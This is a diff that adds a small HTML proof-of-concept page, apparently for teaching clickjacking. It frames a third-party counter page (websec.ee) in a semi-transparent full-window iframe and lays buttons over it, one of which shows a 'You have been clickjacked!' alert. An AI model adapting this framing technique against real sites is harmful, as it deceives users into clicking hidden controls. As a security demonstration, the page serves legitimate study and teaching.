@@ -1,0 +1,41 @@
+<html>
+<head>
+  <title>Clickjacking Demo</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100%;
+    }
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      opacity: 0.8;
+      z-index: 2;
+    }
+    .div-overlay {
+      position: absolute;
+      top: 88px;
+      width: 100%;
+      text-align: center;
+      z-index: 3;
+    }
+    button.new-overlay-btn {
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <iframe src="https://websec.ee/ui/count.php"></iframe>
+
+  <div class="div-overlay">
+    <button class="new-overlay-btn" onclick="event.stopPropagation(); alert('You have been clickjacked!');">Add</button>
+    <button class="new-overlay-btn">Reset</button>
+  </div>
+</body>
+</html>
